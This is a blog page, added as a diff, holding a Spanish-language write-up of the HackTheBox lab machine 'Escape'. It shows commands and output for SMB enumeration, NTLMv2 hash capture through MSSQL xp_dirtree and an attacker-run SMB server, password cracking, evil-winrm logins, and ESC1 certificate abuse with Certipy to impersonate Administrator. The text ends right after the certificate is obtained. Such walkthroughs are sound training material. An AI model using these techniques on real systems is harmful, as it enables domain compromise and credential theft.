@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox Escape</title>
+
+  <meta name="description" content="Resolución de la máquina Escape de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox Escape">
+  <meta name="twitter:description" content="Resolución de la máquina Escape de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/escape.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox Escape">
+  <meta property="og:description" content="Resolución de la máquina Escape de la plataforma de HackTheBox">
+  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/escape.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/escape.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Escape" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/htb" title="GatoGamer1155" class="blog-button">HackTheBox</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#shell-sql_svc">Shell - sql_svc</a></li>
+        <li><a href="#shell-ryan_cooper">Shell - Ryan.Cooper</a></li>
+        <li><a href="#shell-administrator">Shell - Administrator</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/escape.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Escape</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos varios puertos abiertos, en Windows es recomendable usar el parametro <code class="language-plaintext highlighter-rouge">-Pn</code> para forzar el escaneo aunque no reciba respuesta de los paquetes ping</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">10.10.11.202 -Pn
+Nmap scan report for 10.10.11.202  
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+1433/tcp  open  ms-sql-s
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49667/tcp open  unknown
+49689/tcp open  unknown
+49690/tcp open  unknown
+49713/tcp open  unknown
+49718/tcp open  unknown</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">crackmapexec</code> podemos obtener información de la maquina asi como el <code class="language-plaintext highlighter-rouge">dominio</code> que es <code class="language-plaintext highlighter-rouge">sequel.htb</code> ademas del nombre que parece es el propio <code class="language-plaintext highlighter-rouge">DC</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.11.202
+</span><span class="az">SMB         </span><span class="p">10.10.11.202     445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para posibles proximos ataques o solo por comodidad agregaremos el <code class="language-plaintext highlighter-rouge">dominio</code> al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> ademas el <code class="language-plaintext highlighter-rouge">nombre</code> de la máquina que es el DC como otro dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">"10.10.11.202 sequel.htb dc.sequel.htb"</span><span class="p"> | </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al listar los recursos compartidos a nivel de <code class="language-plaintext highlighter-rouge">SMB</code> publicos como el usuario <code class="language-plaintext highlighter-rouge">null</code> sin proporcionar contraseña podemos ver privilegios de lectura en el recurso <code class="language-plaintext highlighter-rouge">Public</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb sequel.htb -u null -p </span><span class="am">''</span><span class="p"> --shares
+</span><span class="az">SMB         </span><span class="p">sequel.htb      445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">sequel.htb      445    DC               </span><span class="ve">[+] </span><span class="p">sequel.htb\null: 
+</span><span class="az">SMB         </span><span class="p">sequel.htb      445    DC               </span><span class="ve">[+] </span><span class="p">Enumerated shares
+</span><span class="az">SMB         </span><span class="p">sequel.htb      445    DC               </span><span class="am">Share           Permissions     Remark
+</span><span class="az">SMB         </span><span class="p">sequel.htb      445    DC               </span><span class="am">-----           -----------     ------
+</span><span class="az">SMB         </span><span class="p">sequel.htb      445    DC               </span><span class="am">ADMIN$                          Remote Admin
+</span><span class="az">SMB         </span><span class="p">sequel.htb      445    DC               </span><span class="am">C$                              Default share
+</span><span class="az">SMB         </span><span class="p">sequel.htb      445    DC               </span><span class="am">IPC$            READ            Remote IPC
+</span><span class="az">SMB         </span><span class="p">sequel.htb      445    DC               </span><span class="am">NETLOGON                        Logon server share 
+</span><span class="az">SMB         </span><span class="p">sequel.htb      445    DC               </span><span class="am">Public          READ            
+</span><span class="az">SMB         </span><span class="p">sequel.htb      445    DC               </span><span class="am">SYSVOL                          Logon server share</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al conectarnos con <code class="language-plaintext highlighter-rouge">smbclient</code> al recurso Public solo vemos un <code class="language-plaintext highlighter-rouge">pdf</code>, lo descargamos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-smbclient </span><span class="p">sequel.htb/null@dc.sequel.htb -no-pass
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Type help for list of commands
+# use Public
+# ls
+drw-rw-rw-          0  Sat Nov 19 06:51:25 2022 .
+drw-rw-rw-          0  Sat Nov 19 06:51:25 2022 ..
+-rw-rw-rw-      49551  Sat Nov 19 06:51:25 2022 SQL Server Procedures.pdf  
+# get SQL Server Procedures.pdf
+#</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-sql_svc">
+<br><h3 class="post-title">Shell - sql_svc</h3><br>
+
+<p class="plain-text">El pdf contiene un poco de información sobre <code class="language-plaintext highlighter-rouge">mssql</code>, casi al final de este se proporcionan <code class="language-plaintext highlighter-rouge">credenciales</code> para que los usuarios nuevos se conecten a la db</p>
+<a href="/htb/escape/1.png" target="_blank"><div><p><img src="/htb/escape/1.png"></p></div></a>
+
+<p class="plain-text">Al conectarnos con <code class="language-plaintext highlighter-rouge">mssqlclient</code> con estas credenciales parece que son validas</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-mssqlclient </span><span class="p">sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
+[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Una de las cosas a probar es <code class="language-plaintext highlighter-rouge">xp_dirtree</code> asi que de antes creamos un servidor <code class="language-plaintext highlighter-rouge">SMB</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo impacket-smbserver </span><span class="p">kali . -smb2support
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0  
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ejecutamos <code class="language-plaintext highlighter-rouge">xp_dirtree</code> hacia nuestro host indicando el servidor <code class="language-plaintext highlighter-rouge">SMB</code> que hemos creado antes y funciona, parece que tenemos los privilegios de usarlo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> xp_dirtree '\\10.10.14.10\kali\'
+
+subdirectory                           depth
+------------------------------------   ---------------------------------  
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al conectarse la maquina a nuestro servidor realizó una <code class="language-plaintext highlighter-rouge">autenticación</code> la cual se refleja en de nuestro lado como un hash <code class="language-plaintext highlighter-rouge">NTLMv2</code> en este caso del usuario <code class="language-plaintext highlighter-rouge">sql_svc</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo impacket-smbserver </span><span class="p">kali . -smb2support
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.11.202,61174)
+[*] AUTHENTICATE_MESSAGE (sequel\sql_svc,DC)
+[*] User DC\sql_svc authenticated successfully
+[*] sql_svc::sequel:aaaaaaaaaaaaaaaa:1d5be3b38c777fb9817e5ba684ed1e4c:010100000000000080944ad6c89ed90168a70640246b85620000000001001000590072004300580052006f005400630003001000590072004300580052006f005400630002001000720057007a0061004500780076007a0004001000720057007a0061004500780076007a000700080080944ad6c89ed9010600040002000000080030003000000000000000000000000030000024ab22733f49f78de902bb3acb19c36701d90d7e0c2f8e64d16a083ef9cde3740a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100350035000000000000000000  
+[*] Closing down connection (10.10.11.202,61174)
+[*] Remaining connections []</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Guardamos el hash en un archivo y al pasarselo a <code class="language-plaintext highlighter-rouge">john</code> este logra crackearlo por fuerza bruta y nos muestra la contraseña del usuario <code class="language-plaintext highlighter-rouge">sql_svc</code> en texto plano</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">REGGIE1234ronnie</span><span class="p"> (</span><span class="am">sql_svc</span><span class="p">)
+Use the "--show" options to display all of the cracked passwords reliably  
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Comprobamos la contraseña del usuario sql_svc con <code class="language-plaintext highlighter-rouge">crackmapexec</code>, este nos devuelve que la contraseña es valida tanto para SMB asi como para <code class="language-plaintext highlighter-rouge">winrm</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb sequel.htb -u sql_svc -p REGGIE1234ronnie
+</span><span class="az">SMB         </span><span class="p">sequel.htb      445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">sequel.htb      445    DC               </span><span class="ve">[+] </span><span class="p">sequel.htb\sql_svc:REGGIE1234ronnie 
+
+</span><span class="ve">❯ crackmapexec </span><span class="p">winrm sequel.htb -u sql_svc -p REGGIE1234ronnie
+</span><span class="az">SMB         </span><span class="p">sequel.htb      5985   DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)
+</span><span class="az">HTTP        </span><span class="p">sequel.htb      5985   DC               </span><span class="az">[*] </span><span class="p">http://sequel.htb:5985/wsman
+</span><span class="az">WINRM       </span><span class="p">sequel.htb      5985   DC               </span><span class="ve">[+] </span><span class="p">sequel.htb\sql_svc:REGGIE1234ronnie </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Simplemente nos conectamos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> y conseguimos una powershell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm</span><span class="p"> -i sequel.htb -u sql_svc -p REGGIE1234ronnie  
+PS C:\Users\sql_svc\Documents> </span><span class="am">whoami</span><span class="p">
+sequel\sql_svc
+PS C:\Users\sql_svc\Documents></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-ryan_cooper">
+<br><h3 class="post-title">Shell - Ryan.Cooper</h3><br>
+
+<p class="plain-text">En el directorio <code class="language-plaintext highlighter-rouge">C:\</code> vemos un directorio llamado <code class="language-plaintext highlighter-rouge">SQLServer</code> y dentro de este un directorio <code class="language-plaintext highlighter-rouge">Logs</code> el cual solo contiene un backup de logs llamado <code class="language-plaintext highlighter-rouge">ERRORLOG.BAK</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\> </span><span class="am">dir</span><span class="p">
+
+    Directory: C:\
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         2/1/2023   8:15 PM                PerfLogs
+d-r---         2/6/2023  12:08 PM                Program Files
+d-----       11/19/2022   3:51 AM                Program Files (x86)  
+d-----       11/19/2022   3:51 AM                Public
+d-----         2/1/2023   1:02 PM                SQLServer
+d-r---         2/1/2023   1:55 PM                Users
+d-----         2/6/2023   7:21 AM                Windows
+
+PS C:\> </span><span class="am">cd </span><span class="p">SQLServer
+PS C:\SQLServer> </span><span class="am">dir</span><span class="p">
+
+    Directory: C:\SQLServer
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         2/7/2023   8:06 AM                Logs
+d-----       11/18/2022   1:37 PM                SQLEXPR_2019
+-a----       11/18/2022   1:35 PM        6379936 sqlexpress.exe
+-a----       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe  
+
+PS C:\SQLServer> </span><span class="am">cd </span><span class="p">Logs
+PS C:\SQLServer\Logs> </span><span class="am">dir</span><span class="p">
+
+    Directory: C:\SQLServer\Logs
+1
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK
+
+PS C:\SQLServer\Logs></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En este backup buscamos lineas que contengan la cadena <code class="language-plaintext highlighter-rouge">password</code>, y se nos muestra una autenticacion fallida como el usuario <code class="language-plaintext highlighter-rouge">Ryan.Cooper</code> y su contraseña</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\SQLServer\Logs> </span><span class="am">Select-String </span><span class="az">"password" </span><span class="p">ERRORLOG.BAK
+
+ERRORLOG.BAK:70:2022-11-18 13:43:06.75 spid18s     Password policy update was successful.
+ERRORLOG.BAK:112:2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]  
+ERRORLOG.BAK:114:2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
+
+PS C:\SQLServer\Logs></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Comprobamos la contraseña de <code class="language-plaintext highlighter-rouge">Ryan.Cooper</code> nuevamente con <code class="language-plaintext highlighter-rouge">crackmapexec</code> y es valida, de nuevo acepta las credenciales tanto a nivel de SMB como de <code class="language-plaintext highlighter-rouge">winrm</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb sequel.htb -u Ryan.Cooper -p NuclearMosquito3
+</span><span class="az">SMB         </span><span class="p">sequel.htb      445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">sequel.htb      445    DC               </span><span class="ve">[+] </span><span class="p">sequel.htb\Ryan.Cooper:NuclearMosquito3 
+
+</span><span class="ve">❯ crackmapexec </span><span class="p">winrm sequel.htb -u Ryan.Cooper -p NuclearMosquito3
+</span><span class="az">SMB         </span><span class="p">sequel.htb      5985   DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)
+</span><span class="az">HTTP        </span><span class="p">sequel.htb      5985   DC               </span><span class="az">[*] </span><span class="p">http://sequel.htb:5985/wsman
+</span><span class="az">WINRM       </span><span class="p">sequel.htb      5985   DC               </span><span class="ve">[+] </span><span class="p">sequel.htb\Ryan.Cooper:NuclearMosquito3 </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nos conectamos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> y conseguimos una shell, podemos leer la <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm</span><span class="p"> -i sequel.htb -u Ryan.Cooper -p NuclearMosquito3  
+PS C:\Users\Ryan.Cooper\Documents> </span><span class="am">whoami</span><span class="p">
+sequel\ryan.cooper
+PS C:\Users\Ryan.Cooper\Documents> </span><span class="am">type</span><span class="p"> ..\Desktop\user.txt
+802**************************aa6
+PS C:\Users\Ryan.Cooper\Documents></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-administrator">
+<br><h3 class="post-title">Shell - Administrator</h3><br>
+
+<p class="plain-text">Para enumerar un poco el sistema usaremos <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">winpeas</a>, podemos subirlo facilmente usando la función <code class="language-plaintext highlighter-rouge">upload</code> incluida en la herramienta evil-winrm</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Ryan.Cooper\Documents> </span><span class="am">upload </span><span class="p">winpeas.exe
+</span><span class="az">
+Info: Uploading winpeas.exe to C:\Users\Ryan.Cooper\Documents\winpeas.exe  
+</span><span class="sa">
+Data: 2581844 bytes of 2581844 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\Ryan.Cooper\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Casi al final winpeas nos muestra que existen varios <code class="language-plaintext highlighter-rouge">certificados</code> en la maquina</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="az">ÉÍÍÍÍÍÍÍÍÍÍ¹ </span><span class="ve">Enumerating machine and user certificate files</span><span class="p">
+
+  Issuer             : CN=sequel-DC-CA, DC=sequel, DC=htb
+  Subject            :
+  ValidDate          : 11/18/2022 1:05:34 PM
+  ExpiryDate         : 11/18/2023 1:05:34 PM
+  HasPrivateKey      : True
+  StoreLocation      : LocalMachine
+  KeyExportable      : True
+  Thumbprint         : B3954D2D39DCEF1A673D6AEB9DE9116891CE57B2
+
+  Template           : Template=Kerberos Authentication(1.3.6.1.4.1.311.21.8.15399414.11998038.16730805.7332313.6448437.247.1.33), Major Version Number=110, Minor Version Number=0  
+</span><span class="az">  Enhanced Key Usages</span><span class="p">
+       Client Authentication     [*] Certificate is used for client authentication!
+       Server Authentication
+       Smart Card Logon
+       KDC Authentication
+</span><span class="c1">   =================================================================================================</span><span class="p">
+
+  Issuer             : CN=sequel-DC-CA, DC=sequel, DC=htb
+  Subject            : CN=sequel-DC-CA, DC=sequel, DC=htb
+  ValidDate          : 11/18/2022 12:58:46 PM
+  ExpiryDate         : 11/18/2121 1:08:46 PM
+  HasPrivateKey      : True
+  StoreLocation      : LocalMachine
+  KeyExportable      : True
+  Thumbprint         : A263EA89CAFE503BB33513E359747FD262F91A56
+
+</span><span class="c1">   =================================================================================================</span><span class="p">
+
+  Issuer             : CN=sequel-DC-CA, DC=sequel, DC=htb
+  Subject            : CN=dc.sequel.htb
+  ValidDate          : 11/18/2022 1:20:35 PM
+  ExpiryDate         : 11/18/2023 1:20:35 PM
+  HasPrivateKey      : True
+  StoreLocation      : LocalMachine
+  KeyExportable      : True
+  Thumbprint         : 742AB4522191331767395039DB9B3B2E27B6F7FA
+
+  Template           : DomainController
+  Enhanced Key Usages
+       Client Authentication     [*] Certificate is used for client authentication!
+       Server Authentication
+</span><span class="c1">   =================================================================================================</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Haremos uso de <a href="https://github.com/ly4k/Certipy">certipy</a> para buscar certificados <code class="language-plaintext highlighter-rouge">vulnerables</code> proporcionando las credenciales de <code class="language-plaintext highlighter-rouge">Ryan.Cooper</code> y el parametro <code class="language-plaintext highlighter-rouge">-stdout</code> para ver el output de primeras</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ certipy </span><span class="p">find -vulnerable -u Ryan.Cooper@sequel.htb -p NuclearMosquito3 -stdout
+Certipy v4.4.0 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Trying to get CA configuration for 'sequel-DC-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'sequel-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.  
+[*] Trying to get CA configuration for 'sequel-DC-CA' via RRP
+[*] Got CA configuration for 'sequel-DC-CA'
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : sequel-DC-CA
+    DNS Name                            : dc.sequel.htb
+    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
+    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
+    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
+    Certificate Validity End            : 2121-11-18 21:08:46+00:00
+    Web Enrollment                      : Disabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : SEQUEL.HTB\Administrators
+      Access Rights
+        ManageCa                        : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        ManageCertificates              : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        Enroll                          : SEQUEL.HTB\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : UserAuthentication
+    Display Name                        : UserAuthentication
+    Certificate Authorities             : sequel-DC-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : IncludeSymmetricAlgorithms
+                                          PublishToDs
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Client Authentication
+                                          Secure Email
+                                          Encrypting File System
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 10 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Domain Users
+                                          SEQUEL.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : SEQUEL.HTB\Administrator
+        Write Owner Principals          : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+        Write Property Principals       : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+    [!] Vulnerabilities
+      ESC1                              : 'SEQUEL.HTB\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Parece que el Template <code class="language-plaintext highlighter-rouge">UserAuthentication</code> con el CA <code class="language-plaintext highlighter-rouge">sequel-DC-CA</code> es vulnerable, podemos hacer una peticion con esa informacion usando como upn a <code class="language-plaintext highlighter-rouge">Administrator</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ certipy </span><span class="p">req -u Ryan.Cooper@sequel.htb -p NuclearMosquito3 -ca sequel-DC-CA -template UserAuthentication -upn Administrator@sequel.htb  
+Certipy v4.4.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 11
+[*] Got certificate with UPN 'Administrator@sequel.htb'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'</span>
+</code></pre></div></div><br>
+
